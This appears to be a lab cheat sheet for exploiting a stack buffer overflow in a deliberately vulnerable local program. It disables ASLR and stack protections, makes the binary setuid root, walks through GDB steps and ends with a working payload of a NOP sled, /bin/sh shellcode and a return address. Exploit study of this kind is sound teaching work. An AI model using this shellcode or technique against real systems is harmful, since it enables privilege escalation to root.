ASLR off
---------------
    echo 0 > /proc/sys/kernel/randomize_va_space
Compile with No-StackProtection
-------------------------------
    gcc -m32 -g -fno-stack-protector -z execstack -o vuln vulnerable.c

User Configuration for ELF
------------------------
    sudo chown root vuln
    sudo chgrp root vuln
    sudo chmod +s vuln


Debugging
--------------
    gdb -q vuln
    start
    disass main
    #To see EIP is actually overflowed
    break *0x401207
    #Register info
    info registers
    #Test EIP with Buffer
    run $(python -c "print('A'*256)")
    run $(python -c "print('A'*252+'B'*4)")
    #Locate return address of stack with our payload
    x/100x $esp
    x/100x $ebp

**Import the address of the payload to your shellcode and run from GDB!**

BOF Final Code
----------------
    run $(python -c "print('\x90'*202+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'+'\x90'*25+'\x40\xf4\xff\xbf')")
